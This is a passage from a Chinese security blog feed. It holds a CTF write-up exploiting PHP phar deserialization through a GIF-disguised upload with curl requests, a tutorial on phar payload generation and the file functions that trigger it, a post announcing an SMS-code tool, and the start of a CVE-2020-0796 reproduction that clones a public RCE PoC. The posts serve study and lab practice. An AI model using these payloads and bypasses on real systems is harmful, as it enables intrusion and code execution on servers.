class="keyword">die</span>(<span class="string">"Bye"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!hash_equals(hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET), $hmac)) &#123; <span class="comment">// 判断data加密之后和hmac签名是否对应</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye Bye"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $data = unserialize($data); <span class="comment">// 反序列化</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data-&gt;avatar)) &#123; <span class="comment">//如果反序列化之后的data包含的类中无avatar成员,输出一条消息，并退出当前脚本</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye Bye Bye"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data-&gt;avatar; <span class="comment">//返回上传路径 </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// 检查文件头是否为GIF89a，不等于GIF89a 返回fuck off</span></span><br><span class="line">    $data = file_get_contents($_GET[<span class="string">"url"</span>] . <span class="string">"/avatar.gif"</span>);</span><br><span class="line">    <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">"GIF89a"</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Fuck off"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file_put_contents($path . <span class="string">"/avatar.gif"</span>, $data); <span class="comment">//把一个$data写入（路径）/avatar.gif文件中</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Upload OK"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// 查看/avatar.gif</span></span><br><span class="line">    <span class="keyword">if</span> (!file_exists($path . <span class="string">"/avatar.gif"</span>)) &#123; <span class="comment">//查文件或目录是否存在</span></span><br><span class="line">        $path = <span class="string">"/var/www/html"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Content-Type: image/gif"</span>); <span class="comment">//gif图片格式 </span></span><br><span class="line">    <span class="keyword">die</span>(file_get_contents($path . <span class="string">"/avatar.gif"</span>)); <span class="comment">//将文件内容读入输出并退出</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mode = $_GET[<span class="string">"m"</span>];</span><br><span class="line"><span class="keyword">if</span> ($mode == <span class="string">"upload"</span>) &#123;</span><br><span class="line">    upload(check_session()); <span class="comment">//从cookie中提取data反序列化后的avatar成员并将其内容作为路径, 请求url中的内容写到该路径下的avatar.gif文件中</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">"show"</span>) &#123;</span><br><span class="line">    show(check_session()); <span class="comment">//从cookie中提取data反序列化后的avatar成员并将其内容作为路径, 展示该目录下的avatar.gif</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); <span class="comment">//对取得当前文件的绝对地址文件进行语法高亮显示</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="思路解析"><a href="#思路解析" class="headerlink" title="思路解析"></a>思路解析</h4><p>首先分析代码, 首先定义了一个getFlag函数, 执行了这个函数就会出flag, 所以整道题的核心就是执行这个函数</p>
<p>题目主要有两个功能, 一个是在沙盒文件夹任意写入一个gif, 一个是根据cookie中的路径查看这个gif</p>
<h5 id="初步想法"><a href="#初步想法" class="headerlink" title="初步想法"></a>初步想法</h5><p>admin是关键类,利用通过反序列化之后的析构函数去通过lucky参数去调用Getflag函数输出flag，而反序列化的data是从cookie中获得, 那先尝试一下伪造cookie,但是其实cookie后半部分是用hash_hmac和一个未知的秘钥生成的一个签名, 无法绕过判断机制，基本上不可能伪造的了。</p>
<h5 id="本题考点"><a href="#本题考点" class="headerlink" title="本题考点"></a>本题考点</h5><p>php中解析Phar归档中的Metadata的时候会有反序列化的操作</p>
<p><a href="https://www.php.net/manual/zh/phar.getmetadata.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/phar.getmetadata.php</a></p>
<p><a href="https://scriptkid-beta.github.io/2020/06/09/Phar/">Phar://</a></p>
<h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><h5 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h5><p>生成phar的gif头格式文件，并修改后缀名为gif</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"avatar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stubb，增加gif文件头</span></span><br><span class="line">    $o = <span class="keyword">new</span> Admin();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest里</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">// 添加要压缩的文件</span></span><br><span class="line">    $phar-&gt;stopBuffering(); <span class="comment">// 签名自动计算</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>并将生成的gif图放到自己的http服务器中(这里本地python临时起的服务)</p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83/image-20200611132224047.png" alt="image-20200611132224047"></p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">http://www.xxxx.com/<span class="meta">index</span>.php?m=upload<span class="variable">&amp;url</span>=http://10.255.252.192:8000</span><br><span class="line"></span><br><span class="line">http://www.xxxx.com/<span class="meta">index</span>.php?m=upload<span class="variable">&amp;url</span>=phar:///var/www/data/Y3RmMTAuMjU1LjI1Mi4xOTI=<span class="variable">&amp;lucky</span>=getFlag</span><br><span class="line">注:这里的base64编码（Y3RmMTAuMjU1LjI1Mi4xOTI=）是由(ctf加ip地址)进行base64编码得到的</span><br></pre></td></tr></table></figure>

<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83/image-20200609084749799.png" alt=""></p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83/image-20200609085038212.png" alt="image-20200609085038212"></p>
<h5 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h5><p>生成phar的gif头格式文件，并修改后缀名为gif</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $phar = <span class="keyword">new</span> Phar(<span class="string">"avatar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span></span><br><span class="line"><span class="php">    $phar-&gt;startBuffering();</span></span><br><span class="line"><span class="php">    $phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stubb，增加gif文件头</span></span></span><br><span class="line"><span class="php">    $o = <span class="keyword">new</span> Admin();</span></span><br><span class="line"><span class="php">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest里</span></span></span><br><span class="line"><span class="php">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">// 添加要压缩的文件</span></span></span><br><span class="line"><span class="php">    $phar-&gt;stopBuffering(); <span class="comment">// 签名自动计算</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>并将生成的gif图放到自己的http服务器中(这里本地python临时起的服务)</p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83/image-20200611132224047.png" alt="image-20200611132224047"></p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">curl --cookie-<span class="keyword">jar </span>idlefire <span class="string">"http://www.xxxx.com/index.php"</span></span><br><span class="line"></span><br><span class="line">curl -<span class="keyword">b </span>idlefire <span class="string">"http://www.xxxx.com/index.php?m=upload&amp;url=http://10.255.252.192:8000/"</span></span><br><span class="line"></span><br><span class="line">curl -<span class="keyword">b </span>idlefire <span class="string">"http://www.xxxx.com/index.php?m=upload&amp;url=phar:///var/www/data/Y3RmMTAuMjU1LjI1Mi4xOTI=&amp;lucky=getFlag"</span></span><br><span class="line"></span><br><span class="line">注:这里的<span class="keyword">base64编码（Y3RmMTAuMjU1LjI1Mi4xOTI=）是由(ctf加ip地址)进行base64编码得到的</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83/image-20200609085312907.png" alt="image-20200609085312907"></p>
<h4 id="写到最后"><a href="#写到最后" class="headerlink" title="写到最后"></a>写到最后</h4><p>这题根据经典题目（<a href="https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/baby^h-master-php-2017" target="_blank" rel="noopener">hitcon-ctf-2017baby^h-master-php-2017</a>）进行的改编，在某种程度上进行降低了难度。</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.jianshu.com/p/19e3ee990cb7" target="_blank" rel="noopener">https://www.jianshu.com/p/19e3ee990cb7</a></p>
<p><a href="https://www.bilibili.com/read/cv6347230/" target="_blank" rel="noopener">https://www.bilibili.com/read/cv6347230/</a></p>
<p><a href="https://xz.aliyun.com/t/1773/" target="_blank" rel="noopener">https://xz.aliyun.com/t/1773/</a></p>
<p><a href="https://www.cnblogs.com/jxkshu/p/4997219.html" target="_blank" rel="noopener">https://www.cnblogs.com/jxkshu/p/4997219.html</a></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>phar://</title>
    <url>/2020/06/09/Phar/</url>
    <content><![CDATA[<h4 id="php支持的协议和封装协议"><a href="#php支持的协议和封装协议" class="headerlink" title="php支持的协议和封装协议"></a>php支持的协议和封装协议</h4><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">file:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">ftp:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">php:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">zlib:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">data:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">glob:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">phar:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">ssh2:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">rar:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">ogg:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">expect:</span><span class="comment">//</span></span><br></pre></td></tr></table></figure>

<h4 id="Phar是什么？"><a href="#Phar是什么？" class="headerlink" title="Phar是什么？"></a>Phar是什么？</h4><p>PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，可以方便地将多个文件组合成一个文件。在PHP 5.3 或更高版本中默认支持，这个特性使得 PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。可以像执行任何其他文件一样轻松地执行phar归档，无论是在命令行上还是在web服务器上。</p>
<a id="more"></a>

<h4 id="phar扩展中三种受支持的文件格式（Phar、Tar、Zip）对比"><a href="#phar扩展中三种受支持的文件格式（Phar、Tar、Zip）对比" class="headerlink" title="phar扩展中三种受支持的文件格式（Phar、Tar、Zip）对比"></a>phar扩展中三种受支持的文件格式（Phar、Tar、Zip）对比</h4><p><img src="/img/Phar/image-20200610092038319.png" alt="image-20200610092038319"></p>
<p>这里主要概述Phar</p>
<h4 id="Phar文件结构"><a href="#Phar文件结构" class="headerlink" title="Phar文件结构"></a>Phar文件结构</h4><p>All Phar archives contain three to four sections:</p>
<ol>
<li>a stub</li>
<li>a manifest describing the contents</li>
<li>the file contents</li>
<li>[optional] a signature for verifying Phar integrity (phar file format only)</li>
</ol>
<h5 id="a-stub"><a href="#a-stub" class="headerlink" title="a stub"></a>a stub</h5><p>最小的stub如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="comment"><span class="keyword">__HALT_COMPILER</span>();</span></span></span><br></pre></td></tr></table></figure>

<p>stub要以<em>__HALT_COMPILER（）</em>结尾的要求外，没有任何限制<em>。</em>否则phar扩展名将无法处理Phar。</p>
<h5 id="a-manifest-describing-the-contents"><a href="#a-manifest-describing-the-contents" class="headerlink" title="a manifest describing the contents"></a>a manifest describing the contents</h5><p>Phar清单是一种高度优化的格式，允许按文件指定文件压缩，文件权限，甚至是用户定义的元数据（例如文件用户或组）。</p>
<p>其中Meta-data部分的信息会以反序列化的形式储存，这里就是<strong>漏洞利用的关键点</strong></p>
<p><img src="/img/Phar/image-20200610090122258.png" alt="image-20200610090122258"></p>
<h5 id="the-file-contents"><a href="#the-file-contents" class="headerlink" title="the file contents"></a>the file contents</h5><p>压缩文件的内容</p>
<h5 id="optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only"><a href="#optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only" class="headerlink" title="[optional] a signature for verifying Phar integrity (phar file format only)"></a>[optional] a signature for verifying Phar integrity (phar file format only)</h5><p>包含签名的Phar总是在加载器，清单和文件内容之后，将签名附加到Phar归档文件的末尾。 目前支持的两种签名格式是MD5和SHA1。</p>
<p>签名格式:</p>
<p><img src="/img/Phar/image-20200610091746077.png" alt="image-20200610091746077"></p>
<h4 id="phar文件生成"><a href="#phar文件生成" class="headerlink" title="phar文件生成"></a>phar文件生成</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过以下代码创建一个phar文件</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    	<span class="keyword">public</span> $name=<span class="string">"test"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"test.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stubb</span></span><br><span class="line">    $o = <span class="keyword">new</span> User();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest里</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">// 添加要压缩的文件</span></span><br><span class="line">    $phar-&gt;stopBuffering(); <span class="comment">// 签名自动计算</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果出现如下的异常提示，将php.ini中的phar.readonly修改为Off</p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">Fatal <span class="keyword">error</span>: Uncaught UnexpectedValueException: creating archive <span class="string">"test.phar"</span> disabled <span class="keyword">by</span> the php.ini setting phar.<span class="keyword">readonly</span> <span class="keyword">in</span>...</span><br></pre></td></tr></table></figure>

<p><img src="/img/Phar/image-20200610130230606.png" alt=""></p>
<p>生成得phar文件，并将以十六进制的形式进行查看，一部分序列化的内容就是上述说的Meta-Data</p>
<p><img src="/img/Phar/image-20200610131216585.png" alt=""></p>
<h5 id="生成其他格式文件的Phar文件"><a href="#生成其他格式文件的Phar文件" class="headerlink" title="生成其他格式文件的Phar文件"></a>生成其他格式文件的Phar文件</h5><p>因为phar文件php是通过其文件头的stub来识别的，更确切点来说是<code>__HALT_COMPILER();</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头信息+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过以下代码创建一个其他格式的phar文件</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    	<span class="keyword">public</span> $name=<span class="string">"test"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"gif.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stubb，增加gif文件头</span></span><br><span class="line">    $o = <span class="keyword">new</span> User();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest里</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">// 添加要压缩的文件</span></span><br><span class="line">    $phar-&gt;stopBuffering(); <span class="comment">// 签名自动计算</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/Phar/image-20200610160634614.png" alt="image-20200610160634614"></p>
<h4 id="phar实现反序列化"><a href="#phar实现反序列化" class="headerlink" title="phar实现反序列化"></a>phar实现反序列化</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p><a href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618" target="_blank" rel="noopener">phar.c#L618</a>其调用了<code>php_var_unserialize</code></p>
<p><img src="/img/Phar/image-20200611102749956.png" alt="image-20200611102749956"></p>
<p>通俗点讲：使用phra://伪协议读取文件的时候，文件会被解析成phar对象，这个时候，刚才那部分的序列化的信息就会触发反序列化。因此可以构造一个特殊的phar包，使得攻击代码能够被反序列化。</p>
<h5 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h5><p>生成GIF格式文件的Phar文件，并将后缀名更改为gif</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过以下代码创建一个其他格式的phar文件</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    	<span class="keyword">public</span> $name=<span class="string">"test"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"gif.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stubb，增加gif文件头</span></span><br><span class="line">    $o = <span class="keyword">new</span> User();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest里</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">// 添加要压缩的文件</span></span><br><span class="line">    $phar-&gt;stopBuffering(); <span class="comment">// 签名自动计算</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Test代码：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class<span class="built_in"> User </span>&#123;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">"Test run"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">include(<span class="string">'phar://gif.gif'</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>成功反序列化识别文件内容，采用这种方法可以绕过很大一部分上传检测。</p>
<p>这里可以看到已经反序列化成功触发<code>__destruct</code>方法并且读取了文件内容。</p>
<p><img src="/img/Phar/image-20200610170419400.png" alt="image-20200610170419400"></p>
<p>利用phar函数可以在不适用unserialize()函数的情况下触发PHP反序列化漏洞 。</p>
<p>漏洞点在使用phar://协议读取文件时，文件内容会被解析成phar对象，然后phar对象内的Metadata信息会被反序列化。</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="可触发反序列化的操作函数"><a href="#可触发反序列化的操作函数" class="headerlink" title="可触发反序列化的操作函数"></a>可触发反序列化的操作函数</h5><table>
<thead>
<tr>
<th>可触发反序列化的操作函数</th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>fileatime</td>
<td>filectime</td>
<td>file_exists</td>
<td>file_get_contents</td>
</tr>
<tr>
<td>file_put_contents</td>
<td>file</td>
<td>filegroup</td>
<td>fopen</td>
</tr>
<tr>
<td>fileinode</td>
<td>filemtime</td>
<td>fileowner</td>
<td>fileperms</td>
</tr>
<tr>
<td>is_dir</td>
<td>is_executable</td>
<td>is_file</td>
<td>is_link</td>
</tr>
<tr>
<td>is_readable</td>
<td>is_writable</td>
<td>is_writeable</td>
<td>parse_ini_file</td>
</tr>
<tr>
<td>copy</td>
<td>unlink</td>
<td>stat</td>
<td>readfile</td>
</tr>
</tbody></table>
<h5 id="可触发条件"><a href="#可触发条件" class="headerlink" title="可触发条件"></a>可触发条件</h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、可以上传Phar文件到服务端（不支持远程调用）</span><br><span class="line"><span class="number">2</span>、有可以利用的魔术方法</span><br><span class="line"><span class="number">3</span>、文件操作函数的参数可控</span><br><span class="line"><span class="number">4</span>、无过滤: / phar等特殊字符没有被过滤</span><br><span class="line">提示：</span><br><span class="line">如果有限制不可以phar:<span class="comment">//出现在头几个字符，可以使用Bzip / Gzip协议绕过</span></span><br><span class="line">Postgres、MySQL也可触发phar造成反序列化</span><br></pre></td></tr></table></figure>

<h5 id="CTF案例一"><a href="#CTF案例一" class="headerlink" title="CTF案例一"></a>CTF案例一</h5><p><a href="https://scriptkid-beta.github.io/2020/06/12/记一次CTF拉练/#more">记一次CTF拉练</a></p>
<h5 id="CTF案例二"><a href="#CTF案例二" class="headerlink" title="CTF案例二"></a>CTF案例二</h5><p><a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload%20Labs%202" target="_blank" rel="noopener">SUCTF2019-Upload labs 2</a></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>
<p><a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/38</a></p>
<p><a href="https://www.php.net/manual/zh/book.phar.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/book.phar.php</a></p>
<p><a href="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/#0x01-起源" target="_blank" rel="noopener">http://www.lmxspace.com</a></p>
<p><a href="https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/#0X05-利用-phar-拓展-PHP-反序列化的攻击面" target="_blank" rel="noopener">https://www.k0rz3n.com/</a></p>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>短信接码工具V1.0</title>
    <url>/2020/06/05/%E7%9F%AD%E4%BF%A1%E6%8E%A5%E7%A0%81%E5%B7%A5%E5%85%B7V1.0/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>因平时需要用到短信接码平台来接收一下短信验证码，每次用的时候都要搜索找然后这点那点的感觉很麻烦，然后最近划水居多就拉着小伙伴（@trepverter）一起捣鼓，所以有了这一款短信接码工具V1.0</p>
<a id="more"></a>

<h5 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h5><p>短信接码工具使用了跨平台兼容能力较好的JAVA语言进行编写，并采用以下接码平台网站做为数据来源，进行提取相关数据并展示在界面中。</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">接码平台</span><br><span class="line"><span class="symbol">https:</span><span class="comment">//www.becmd.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//www.z-sms.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//www.shejiinn.com/</span></span><br></pre></td></tr></table></figure>

<h4 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h4><p>无</p>
<h4 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/ScriptKid-Beta/</span>SMS_Code_Gui</span><br></pre></td></tr></table></figure>

<h4 id="使用效果"><a href="#使用效果" class="headerlink" title="使用效果"></a>使用效果</h4><p><img src="/img/%E7%9F%AD%E4%BF%A1%E6%8E%A5%E7%A0%81%E5%B7%A5%E5%85%B7V1.0/image-20200605135036363.png" alt="image-20200605135036363"></p>
<p><img src="/img/%E7%9F%AD%E4%BF%A1%E6%8E%A5%E7%A0%81%E5%B7%A5%E5%85%B7V1.0/image-20200605143827901.png" alt="image-20200605143827901"></p>
<p><img src="/img/%E7%9F%AD%E4%BF%A1%E6%8E%A5%E7%A0%81%E5%B7%A5%E5%85%B7V1.0/image-20200605140856053.png" alt="image-20200605140856053"></p>
<h4 id="写到最后"><a href="#写到最后" class="headerlink" title="写到最后"></a>写到最后</h4><ul>
<li><p>此程序仅是闲暇时开发学习，结构及代码结构不够严谨，功能可能存在bug，请多多谅解。</p>
</li>
<li><p>整体功能基本实现，希望对你有用。最后感谢一起开发的小伙伴（@trepverter）。</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-0796漏洞复现</title>
    <url>/2020/06/05/CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。</p>
<h4 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Windows Server, version <span class="number">1909</span> (Server Core installation)</span><br><span class="line">Windows Server, version <span class="number">1903</span> (Server Core installation)</span><br><span class="line">Windows <span class="number">10</span> Version <span class="number">1903</span> <span class="keyword">for</span> <span class="number">32</span>-bit Systems</span><br><span class="line">Windows <span class="number">10</span> Version <span class="number">1903</span> <span class="keyword">for</span> x64-based Systems</span><br><span class="line">Windows <span class="number">10</span> Version <span class="number">1903</span> <span class="keyword">for</span> ARM64-based Systems</span><br><span class="line">Windows <span class="number">10</span> Version <span class="number">1909</span> <span class="keyword">for</span> <span class="number">32</span>-bit Systems</span><br><span class="line">Windows <span class="number">10</span> Version <span class="number">1909</span> <span class="keyword">for</span> x64-based Systems</span><br><span class="line">Windows <span class="number">10</span> Version <span class="number">1909</span> <span class="keyword">for</span> ARM64-based Systems</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h4 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">攻击机：</span><br><span class="line">版本：Kali <span class="number">2020.2</span></span><br><span class="line">Python版本：Python <span class="number">3.8</span><span class="number">.2</span></span><br><span class="line">IP地址：<span class="number">192.168</span><span class="number">.174</span><span class="number">.136</span></span><br><span class="line"></span><br><span class="line">目标靶机：</span><br><span class="line">镜像：cn_windows_10_business_editions_version_1903_x64_dvd_e001dd2c.iso</span><br><span class="line">版本：Windows <span class="number">10</span> 专业版</span><br><span class="line">版本号：<span class="number">1903</span></span><br><span class="line">OS版本：<span class="number">10.0</span><span class="number">.18362</span> 暂缺 Build <span class="number">18362</span></span><br><span class="line">RAM：<span class="number">2</span>GB</span><br><span class="line">防火墙状态：关闭</span><br><span class="line">IP地址：<span class="number">192.168</span><span class="number">.174</span><span class="number">.135</span></span><br></pre></td></tr></table></figure>

<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="RCE漏洞复现"><a href="#RCE漏洞复现" class="headerlink" title="RCE漏洞复现"></a>RCE漏洞复现</h5><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># POC下载</span></span><br><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/chompie1337/SMBGhost_RCE_PoC</span><br></pre></td></tr></table></figure>

